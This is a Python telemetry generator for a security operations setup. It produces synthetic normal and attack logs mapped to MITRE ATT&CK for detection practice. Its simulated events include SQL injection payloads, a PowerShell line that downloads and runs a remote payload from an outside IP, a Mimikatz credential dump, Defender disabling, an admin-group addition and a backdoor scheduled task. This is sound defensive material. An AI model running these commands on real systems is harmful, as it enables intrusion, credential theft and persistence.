"""
SOC Core: Telemetry Generator
Generates realistic baseline and attack log telemetry simulating:
- Normal business traffic (authentication, web, process, network)
- Attack scenarios: Brute Force, SQLi, Port Scan, Privilege Escalation, Webshell Upload
Maps events to MITRE ATT&CK techniques.
"""
import random
import json
import os
from datetime import datetime, timedelta
from soc_core.models import SecurityEvent

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_DIR = os.path.join(BASE_DIR, "soc_core", "logs")
os.makedirs(LOGS_DIR, exist_ok=True)

# --- Realistic Data Pools ---
ATTACKER_IPS = ["185.220.101.47", "91.109.22.44", "45.33.32.156", "203.0.113.55", "198.51.100.22"]
LEGITIMATE_IPS = ["10.14.0.11", "10.14.0.25", "10.14.0.50", "192.168.1.101", "192.168.1.202"]
HOSTNAMES = ["NOVAVAULT-WEB01", "NOVAVAULT-DB01", "NOVAVAULT-DC01", "NOVAVAULT-DEV03"]
USERNAMES_VALID = ["sarah.chen", "marcus.wright", "admin", "secops", "john.doe"]
USERNAMES_ATTACK = ["root", "administrator", "admin", "sa", "oracle", "test", "guest"]
USER_AGENTS_LEGIT = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36"
]
USER_AGENTS_TOOL = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nmap Scripting Engine",
    "python-requests/2.31.0",
    "Nikto/2.1.6",
    "masscan/1.3.2",
]

all_events: list[SecurityEvent] = []


def _add(event: SecurityEvent):
    all_events.append(event)


def generate_normal_auth_events(count=80):
    """Normal successful/failed logins - baseline traffic."""
    for _ in range(count):
        user = random.choice(USERNAMES_VALID)
        ip = random.choice(LEGITIMATE_IPS)
        success = random.random() > 0.15
        e = SecurityEvent(
            event_category="authentication",
            event_type="successful_login" if success else "failed_login",
            event_action=f"User {user} {'authenticated' if success else 'failed authentication'} from {ip}",
            source_ip=ip,
            destination_ip="10.14.0.1",
            hostname=random.choice(HOSTNAMES),
            username=user,
            log_source="auth_log" if random.random() > 0.5 else "windows_event",
            severity="Info" if success else "Low",
            severity_score=5 if success else 20,
            outcome="success" if success else "failure",
            mitre_tactic="Initial Access",
            mitre_technique="Valid Accounts",
            mitre_technique_id="T1078",
            raw_log=f"{'Accepted' if success else 'Failed'} password for {user} from {ip} port {random.randint(1024,65000)} ssh2",
            timestamp=datetime.now() - timedelta(minutes=random.randint(0, 240))
        )
        _add(e)


def generate_normal_web_events(count=120):
    """Normal web requests."""
    paths = ["/", "/products", "/login", "/api/v1/status", "/static/logo.png", "/favicon.ico"]
    for _ in range(count):
        ip = random.choice(LEGITIMATE_IPS)
        path = random.choice(paths)
        e = SecurityEvent(
            event_category="web",
            event_type="http_request",
            event_action=f"GET {path} from {ip}",
            source_ip=ip,
            destination_ip="10.14.0.1",
            destination_port=443,
            log_source="web_log",
            http_method="GET",
            http_url=path,
            http_status=200,
            user_agent=random.choice(USER_AGENTS_LEGIT),
            severity="Info",
            severity_score=0,
            outcome="success",
            raw_log=f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" 200 {random.randint(512, 8192)}',
            timestamp=datetime.now() - timedelta(minutes=random.randint(0, 240))
        )
        _add(e)


def generate_normal_process_events(count=60):
    """Normal Sysmon process creation events."""
    processes = [
        ("chrome.exe", "explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe --single-argument"),
        ("powershell.exe", "explorer.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ("python.exe", "cmd.exe", "python.exe app.py"),
        ("svchost.exe", "services.exe", "C:\\Windows\\System32\\svchost.exe -k NetworkService"),
    ]
    for _ in range(count):
        proc, parent, cmd = random.choice(processes)
        e = SecurityEvent(
            event_category="process",
            event_type="process_creation",
            event_action=f"Process '{proc}' created",
            source_ip=random.choice(LEGITIMATE_IPS),
            hostname=random.choice(HOSTNAMES),
            username=random.choice(USERNAMES_VALID),
            log_source="sysmon",
            process_name=proc,
            process_command=cmd,
            process_pid=random.randint(1000, 9999),
            parent_process=parent,
            severity="Info",
            severity_score=0,
            outcome="success",
            mitre_tactic="Execution",
            mitre_technique="Command and Scripting Interpreter",
            mitre_technique_id="T1059",
            raw_log=f"EventID=1 ProcessName={proc} CommandLine={cmd} ParentImage={parent}",
            timestamp=datetime.now() - timedelta(minutes=random.randint(0, 240))
        )
        _add(e)


# ========================
# ATTACK SIMULATIONS
# ========================

def simulate_brute_force(attacker_ip=None, count=25):
    """MITRE T1110: Brute Force - SSH / Admin Login."""
    ip = attacker_ip or random.choice(ATTACKER_IPS)
    target = random.choice(HOSTNAMES)
    for i in range(count):
        user = USERNAMES_ATTACK[i % len(USERNAMES_ATTACK)]
        e = SecurityEvent(
            event_category="authentication",
            event_type="brute_force_attempt",
            event_action=f"Rapid failed authentication attempt #{i+1} for user '{user}' from {ip}",
            source_ip=ip,
            source_port=random.randint(40000, 65000),
            destination_ip="10.14.0.1",
            destination_port=22,
            hostname=target,
            username=user,
            log_source="auth_log",
            severity="High" if i > 5 else "Medium",
            severity_score=80 if i > 5 else 50,
            alert_triggered=i >= 5,
            outcome="failure",
            mitre_tactic="Credential Access",
            mitre_technique="Brute Force",
            mitre_technique_id="T1110",
            raw_log=f"Failed password for invalid user {user} from {ip} port {random.randint(40000,65000)} ssh2",
            timestamp=datetime.now() - timedelta(seconds=random.randint(0, 180))
        )
        _add(e)


def simulate_sqli_attack(attacker_ip=None, count=18):
    """MITRE T1190: Exploit Public-Facing Application - SQL Injection."""
    ip = attacker_ip or random.choice(ATTACKER_IPS)
    payloads = [
        "/products?category=Hardware%27",
        "/products?q=%27+UNION+SELECT+id,username,password,4,5+FROM+users+--",
        "/login?username=admin%27+--&password=x",
        "/search?query=%27+OR+%271%27%3D%271",
        "/api/v1/users?id=1+ORDER+BY+10+--",
    ]
    for i, payload in enumerate(payloads[:count]):
        e = SecurityEvent(
            event_category="web",
            event_type="sqli_attempt",
            event_action=f"SQL Injection pattern detected in request URI",
            source_ip=ip,
            source_port=random.randint(40000, 65000),
            destination_ip="10.14.0.1",
            destination_port=5000,
            log_source="network_ids",
            http_method="GET",
            http_url=payload,
            http_status=500,
            user_agent=USER_AGENTS_TOOL[0],
            severity="Critical",
            severity_score=95,
            alert_triggered=True,
            outcome="detected",
            mitre_tactic="Initial Access",
            mitre_technique="Exploit Public-Facing Application",
            mitre_technique_id="T1190",
            rule_id="IDS-WEB-002",
            rule_name="SQL Injection Attempt Detected",
            raw_log=f'{ip} - - "GET {payload} HTTP/1.1" 500 1024 "-" "{USER_AGENTS_TOOL[0]}"',
            timestamp=datetime.now() - timedelta(minutes=random.randint(1, 30))
        )
        _add(e)


def simulate_port_scan(attacker_ip=None, count=30):
    """MITRE T1046: Network Service Discovery - Port Scanning."""
    ip = attacker_ip or random.choice(ATTACKER_IPS)
    target = "10.14.0.1"
    ports = [21, 22, 23, 25, 80, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
    for i, port in enumerate(ports[:count]):
        e = SecurityEvent(
            event_category="network",
            event_type="port_scan",
            event_action=f"SYN port probe to {target}:{port} — Reconnaissance scan",
            source_ip=ip,
            source_port=random.randint(40000, 65000),
            destination_ip=target,
            destination_port=port,
            log_source="network_ids",
            protocol="TCP",
            severity="Medium" if i < 5 else "High",
            severity_score=60 if i < 5 else 75,
            alert_triggered=i >= 3,
            outcome="detected",
            mitre_tactic="Discovery",
            mitre_technique="Network Service Discovery",
            mitre_technique_id="T1046",
            rule_id="IDS-NET-001",
            rule_name="Rapid Sequential Port Scanning Detected",
            user_agent=USER_AGENTS_TOOL[1],
            raw_log=f"ALERT TCP {ip} -> {target}:{port} [**] [1:1000001:1] Nmap SYN Stealth Scan [**]",
            timestamp=datetime.now() - timedelta(minutes=random.randint(5, 60))
        )
        _add(e)


def simulate_privilege_escalation(count=8):
    """MITRE T1059 + T1548: Suspicious command execution & privilege escalation."""
    ip = random.choice(LEGITIMATE_IPS)
    hostname = "NOVAVAULT-DC01"
    suspicious_cmds = [
        ("cmd.exe", "net localgroup administrators attacker /add", "Adds user to local admin group"),
        ("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true", "Disables Windows Defender"),
        ("powershell.exe", "whoami /priv", "Enumerates current privileges"),
        ("cmd.exe", "net user /domain", "Domain user enumeration"),
        ("powershell.exe", "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'", "Mimikatz credential dump"),
        ("cmd.exe", "schtasks /create /sc minute /mo 5 /tn backdoor /tr calc.exe", "Persistence via scheduled task"),
        ("powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/payload.ps1')", "Remote payload download"),
        ("wscript.exe", "C:\\Users\\Public\\evil.vbs", "Suspicious VBScript execution"),
    ]
    for i, (proc, cmd, desc) in enumerate(suspicious_cmds[:count]):
        e = SecurityEvent(
            event_category="process",
            event_type="suspicious_process",
            event_action=desc,
            source_ip=ip,
            hostname=hostname,
            username="sarah.chen",
            log_source="sysmon",
            process_name=proc,
            process_command=cmd,
            process_pid=random.randint(1000, 9999),
            parent_process="explorer.exe",
            severity="Critical",
            severity_score=92,
            alert_triggered=True,
            outcome="detected",
            mitre_tactic="Privilege Escalation",
            mitre_technique="Abuse Elevation Control Mechanism",
            mitre_technique_id="T1548",
            rule_id="SIEM-PROC-005",
            rule_name="Suspicious Administrative Command Execution",
            raw_log=f"EventID=1 ProcessName={proc} CommandLine={cmd} User=sarah.chen Host={hostname}",
            timestamp=datetime.now() - timedelta(minutes=random.randint(0, 15))
        )
        _add(e)


def simulate_webshell_upload(attacker_ip=None, count=5):
    """MITRE T1505.003: Server Software Component - Web Shell."""
    ip = attacker_ip or random.choice(ATTACKER_IPS)
    payloads = [
        ("/upload_avatar", "webshell.php", "application/octet-stream"),
        ("/upload_avatar", "cmd.aspx", "image/jpeg"),
        ("/upload_avatar", "exploit.jsp", "application/x-jpg"),
        ("/upload_avatar", "backdoor.py", "image/png"),
        ("/upload_avatar", "c99.php5", "multipart/form-data"),
    ]
    for i, (path, fname, mime) in enumerate(payloads[:count]):
        e = SecurityEvent(
            event_category="web",
            event_type="webshell_upload_attempt",
            event_action=f"Malicious file upload attempt: '{fname}' disguised as {mime}",
            source_ip=ip,
            source_port=random.randint(40000, 65000),
            destination_ip="10.14.0.1",
            destination_port=5000,
            log_source="web_log",
            http_method="POST",
            http_url=path,
            http_status=200,
            user_agent=random.choice(USER_AGENTS_TOOL),
            severity="Critical",
            severity_score=98,
            alert_triggered=True,
            outcome="detected",
            mitre_tactic="Persistence",
            mitre_technique="Server Software Component: Web Shell",
            mitre_technique_id="T1505.003",
            rule_id="IDS-WEB-005",
            rule_name="Malicious File Upload - Web Shell Detected",
            raw_log=f'{ip} - POST {path} multipart fname={fname} content-type={mime} status=200',
            timestamp=datetime.now() - timedelta(minutes=random.randint(0, 20))
        )
        _add(e)


def generate_all_telemetry(save_to_file=True) -> list[SecurityEvent]:
    """Generate complete realistic SOC telemetry dataset."""
    global all_events
    all_events = []

    print("[*] Generating baseline normal traffic...")
    generate_normal_auth_events(80)
    generate_normal_web_events(120)
    generate_normal_process_events(60)

    print("[*] Simulating attack scenarios...")
    attacker = random.choice(ATTACKER_IPS)
    simulate_brute_force(attacker_ip=attacker, count=25)
    simulate_sqli_attack(attacker_ip=attacker)
    simulate_port_scan(attacker_ip=attacker, count=15)
    simulate_privilege_escalation(count=8)
    simulate_webshell_upload(attacker_ip=attacker, count=5)

    # Sort by timestamp
    all_events.sort(key=lambda e: e.timestamp)

    if save_to_file:
        out_path = os.path.join(LOGS_DIR, "soc_events.json")
        with open(out_path, "w") as f:
            json.dump([e.to_dict() for e in all_events], f, indent=2)
        print(f"[+] {len(all_events)} events saved to {out_path}")

    alerts = [e for e in all_events if e.alert_triggered]
    print(f"[+] Telemetry generated: {len(all_events)} total events, {len(alerts)} alerts triggered")
    return all_events


if __name__ == "__main__":
    generate_all_telemetry()
